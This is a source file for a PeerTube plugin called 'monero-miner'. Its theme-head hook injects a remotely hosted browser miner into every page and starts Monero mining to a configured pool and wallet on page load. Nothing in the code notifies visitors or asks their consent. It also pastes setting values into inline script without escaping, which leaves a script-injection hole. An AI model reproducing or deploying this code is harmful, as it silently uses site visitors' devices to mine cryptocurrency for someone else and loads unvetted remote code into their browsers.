const fs = require('fs');
const path = require('path');

module.exports = {
  manifest: {
    name: 'monero-miner',
    description: 'PeerTube plugin for Monero mining.',
    version: '1.0.0',
    license: 'MIT',
    author: 'PYU224',
    dependencies: {},
  },

  async register({
    registerHook,
    registerSetting,
  }) {
    // Register settings for Monero Miner
    registerSetting({
      name: 'walletAddress',
      label: 'Monero Wallet Address',
      type: 'input', // Text input
      private: false,
    });

    registerSetting({
      name: 'webSocket',
      label: 'WebSocket Server',
      type: 'input',
      private: false,
      default: 'wss://ny1.xmrminingproxy.com', // Default value
    });

    registerSetting({
      name: 'poolAddress',
      label: 'Mining Pool Address',
      type: 'input',
      private: false,
      default: 'moneroocean.stream',
    });

    registerSetting({
      name: 'threads',
      label: 'Number of Threads',
      type: 'number',
      private: false,
      default: 2, // Default number of threads
    });

    // Hook to inject Monero Miner script into the theme's head
    registerHook({
      target: 'action:theme.head',
      handler: ({ settings }) => {
        const walletAddress = settings.walletAddress || '';
        const webSocket = settings.webSocket || 'wss://ny1.xmrminingproxy.com';
        const poolAddress = settings.poolAddress || 'moneroocean.stream';
        const threads = settings.threads || 2;

        return `
          <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
          <script>
            const server = "${webSocket}";
            const pool = "${poolAddress}";
            const walletAddress = "${walletAddress}";
            const workerId = "GH-XMR";
            const threads = ${threads};
            const password = "";
            startMining(pool, walletAddress, workerId, threads, password);
            throttleMiner = 20;
          </script>
        `;
      },
    });
  },

  async unregister() {
    console.log('Unregistering Monero Miner plugin...');
  },
};
